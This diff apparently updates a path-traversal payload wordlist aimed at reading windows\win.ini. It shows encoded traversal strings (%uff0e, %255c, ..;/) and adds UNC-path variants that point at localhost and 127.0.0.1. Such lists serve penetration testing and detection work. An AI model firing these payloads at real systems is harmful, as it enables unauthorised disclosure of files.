@@ -1731,7 +1731,6 @@ C:\\windows\win.ini
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/\windows\win.ini
 /%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\\windows\win.ini
 /%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/\windows\win.ini
-\\localhost\c$\windows\win.ini
 ..;/windows/win.ini
 ..;/..;/windows/win.ini
 ..;/..;/..;/windows/win.ini
@@ -1748,3 +1747,9 @@ C:\\windows\win.ini
 %2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/windows/win.ini
 %2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/windows/win.ini
 %2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/%2e%2e%3b/windows/win.ini
+\\127.0.0.1\c$\windows\win.ini
+\\\\127.0.0.1\\c$\windows\\win.ini
+//127.0.0.1/c$/windows/win.ini
+\\localhost\c$\windows\win.ini
+\\\\localhost\\c$\\windows\\win.ini
+//localhost/c$/windows/win.ini
